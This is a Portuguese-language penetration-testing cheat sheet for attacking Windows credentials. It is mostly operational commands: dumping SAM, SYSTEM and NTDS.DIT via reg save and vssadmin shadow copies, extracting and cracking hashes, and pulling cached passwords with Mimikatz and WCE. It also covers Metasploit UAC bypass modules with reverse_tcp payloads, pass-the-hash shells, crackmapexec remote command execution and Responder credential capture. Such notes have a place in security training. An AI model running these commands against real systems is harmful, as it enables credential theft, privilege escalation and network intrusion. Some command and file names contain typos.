# Windows Hashes

## Padrão de Hash do Windows

``<Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:``  
LM Hash vazio: aad3b435b51404eeaad3b435b51404ee

## Obtendo hashes de senhas do Windows  
Nos sistemas Windows são utilizados até 3 arquivos para armazenamento e manipulação dos usuários e senhas dependendo da versão do sistema operacional. Os arquivos são:

**SAM - Security Account Manager** *(Windows XP/Vista/7/8/10)*  
- Armazena as contas de usuários
- %SystemRoot/system32/config/sam

**NTDS.DIT** *(Windows Server)*  
- Armazena os dados do AD incluindo as contas de usuários
- %SystemRoot/ntds/ntds.dit

**SYSTEM** *(Windows Server/XP/Vista/7/8/10)*  
- Arquivo necessário para decriptar o SAM/NTDS.DIT
- %SystemRoot/system32/config/system

Todos esses arquivos são bloqueados pelo sistema enquanto o mesmo estiver em execução, abaixo algumas técnicas para burlar essa proteção.

**Windows XP**  
Essa técnica funciona apenas em versões antigas do Windows. Verifique se existe o diretório *%SystemRoot%/Windows/repair* onde existe uma cópia do sistema operacional e faça a busca pelos arquivos **sam** e **system**.

A desvantagem de utilizar os arquivos da pasta *repair* é que pode ocorrer do arquivo sam estar desatualizado, não retornando todos os usuários atuais do sistema.

**Windows XP/Vista/7/8/10**  
Para baixar os arquivos **sam** e **system** através do registro do Windows, utilize os *comandos abaixo direto no terminal da máquina alvo:

``reg save hklm\sam samOK``  
``reg save hklm\system systemOK``

Esse método consegue retornar o arquivo sam com todos os usuários atuais do sistema.

**Necessário permissões para executar comandos como administrador*

**Windows Server/7/8/10**  
Em versões mais modernas do Windows assim como em versões do Windows Server, podemos utilizar a ferramenta ``vssadmin`` para criar uma cópia (shadow) do sistema operacional e fazer o download dos arquivos **sam**, **ntds.dit** e **system**.

Verificar os volumes do sistema operacional  
``vssadmin list volumes``

Montar uma cópia do volume alvo  
``vssadmin create shadow /for=c:``

Copiar os arquivos da cópia para o disco local  
``copy \\?\VOLUME_COPIA\windows\ntds\ntds.nit C:\ntds.nit``  
``copy \\?\VOLUME_COPIA\windows\system32\config\sam C:\sam``  
``copy \\?\VOLUME_COPIA\windows\system32\config\system C:\system``

## Obtendo hashes de senhas na rede  
Outra forma de descobrir os usuários e seus hashes é através da rede, mas nesse método é necessário já ter uma credencial válida do alvo.  

``impacket-secretdump user:pass@host``  

## Bypass UAC (Executar como Administrador)  

**Enviar solicitação ao usuário - Meterpreter**  
Inicie uma sessão com a máquina alvo através do metasploit e deixe em segundo plano com o comando ``background``. Para visualizar as sessões ativas utilize ``sessions``.

Selecione o módulo **exploit/windows/local/ask** e com o comando ``set SESSION 1`` defina que o módulo será executado na sessão que está em background.

Execute o módulo com o comando ``run``, dessa forma será enviada uma mensagem para a máquina alvo solicitando a execução como administrador.

**Nova sessão como administrador - Meterpreter**  
Nessa técnica vamos utilizar dois módulos, o primeiro é um exploit que irá realizar o bypass no UAC e o segundo é o payload que será executado para nos retornar outra shell, mas dessa vez como administrador.

Inicie uma sessão com a máquina alvo através do metasploit e deixe em segundo plano com o comando ``background``. Para visualizar as sessões ativas utilize ``sessions``.

Selecione o módulo **exploit/windows/local/bypassuac_fodhelper**. Faça a configuração do target de acordo com o alvo e selecione a sessão que está em background com o comando ``set SESSION 1``.

Agora definimos o payload com ``set payload windows/x64/meterpreter/reverse_tcp`` e faça a configuração padrão.

Execute o comando ``exploit`` e aguarde o inicio de uma nova sessão com os privilégios de administrador.

## Visualizar Hashes  
Para visualizar os hashes que estão nos arquivos sam e ntds.dit utilize uma das opções:

**Windows 2k/NT/XP/Vista**  
``samdump2 SYSTEM SAM``

**Windows 2k/NT/XP/Vista/7/8/10/Server**  
``impacket-secretdump -sam SAM -system SYSTEM LOCAL``

**Windows Server**  
``impacket-secretdump -ntds ntds.dit -system SYSTEM LOCAL``

## Quebra de Hashes  
Para realizar a quebra dos hashes podemos utilizar a ferramenta john The Ripper.

**Quebra de Hash sem LM** *(aad3b435b51404eeaad3b435b51404ee)***:**  
``jhon --format=nt hash``

**Quebra de Hash com LM:**  
``jhon --format=lm hash``

## Obtendo hashes de senhas do Windows em cache  
Para recuperar hashes de senhas que estão armazenadas no cache ou na memória do Windows, utilize aguns dos utilitários abaixo:

**fgdump**  
*Download: /usr/share/windows-binaries/fgdump/fgdump.exe (Kali)*  
Executar na máquina alvo, irá retornar dois arquivos com os hashes das senhas locais e do AD.

**WCE Universal**  
*Download: /usr/share/windows-resources/wce/wce-universal.exe (Kali)*  
O utilitário wce-universal.exe possui diversas formas de ser executado, duas delas são a mais simples que é sem argumentos, `wce-universal.exe`, onde irá retornar os hashes armazenados no cache e a outra forma é com o argumento -w  `wce-universal.exe -w` que retorna a senha em texto claro.

**Meterpreter**  
Com a sessão iniciada no meterpreter, carregue o módulo mimikatz com `load mimikatz` e utilize uma das variações abaixo:  
  
- `wdigest`
- `mimikatz_command -f sekurlsa::wdigest -a full`
- `mimikatz_command -f sekurlsa::searchPasswords`
- `mimikatz_command -f sekurlsa::logonPasswords`

## Obtendo a shell do alvo  
Com a senha/hash em mãos, podemos tentar nos conetctar ao alvo com uma das opções:

**winexe**  
- `winexe -U user%pass //RHOST cmd.exe `

**pth (Aceita o HASH do usuário)**  
- `pth-winexe -U user%HASH //RHOST cmd.exe `

**psexec (Metasploit)** 
Selecione o módulo **exploit/windows/smb/psexec** e faça as configurações do RHOSTS, SMBUser, SMBPass e SMBDomain. Depois defina o payload da shell reversa **windows/x64/meterpreter/reverse_tcp** e faça a configuração do LHOST e LPORT.
Execute o comando ``exploit`` e aguarde a conexão ser realizada com sucesso.

## Conexão Remota GUI com o alvo  
Para conectar no alvo utilizando interface gráfica, utilize os comandos:
- `xfreerdp /u:USER /p:PASS /v:RHOST`

## crackmapexec (Swiss Army Knife)  
Com esse utilitário é possível executar diversas tarefas como escaneamento da rede, conexão remota, enumeração de usuários e muito mais, alguns exemplos de como utilizar:

**Visualizar módulos de SMB no crackmapexec**
- `crackmapexec smb -L`  

**Enumeração de hosts com SMB na rede**  
- `crackmapexec smb 192.168.0.0/24`  

**Execução de comando em host com SMB na rede**  
- `crackmapexec smb RHOST -u USER -p 'PASS' -x 'whoami'`  

## Responder  
Responder é uma ferramenta muito poderosa para capturar credenciais em uma rede com dispositivos Windows. O responder se aproveita dos protocolos LLMNR e NBT-NS que fazem a identificação de um host na rede para enviar uma confirmação falsa ao solicitande, recebendo dessa forma as credenciais do usuário.

**Utilizar proxy na rede**
`responder -I eth0 -Prv`
